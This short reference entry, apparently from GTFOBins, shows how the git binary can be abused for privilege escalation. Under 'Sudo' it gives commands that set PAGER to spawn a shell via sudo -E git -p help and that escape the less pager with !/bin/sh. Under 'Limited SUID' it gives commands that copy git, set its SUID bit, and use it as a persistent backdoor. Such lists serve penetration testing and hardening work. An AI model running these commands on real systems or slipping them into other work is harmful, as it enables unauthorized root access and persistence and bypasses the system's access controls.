***** Sudo *****
It runs in privileged context and may be used to access the file system,
escalate or maintain access with elevated privileges if enabled on sudo.
    * PAGER='sh -c "exec sh 0<&1"' sudo -E git -p help
    * This invokes the default pager, which is likely to be less, other
      functions may apply.
      sudo git -p help config
      !/bin/sh
***** Limited SUID *****
It runs with the SUID bit set and may be exploited to access the file system,
escalate or maintain access with elevated privileges working as a SUID
backdoor. If it is used to run commands it only works on systems like Debian
that allow the default sh shell to run with SUID privileges.
    * sudo sh -c 'cp $(which git) .; chmod +s ./git'

      PAGER='sh -c "exec sh 0<&1"' ./git -p help
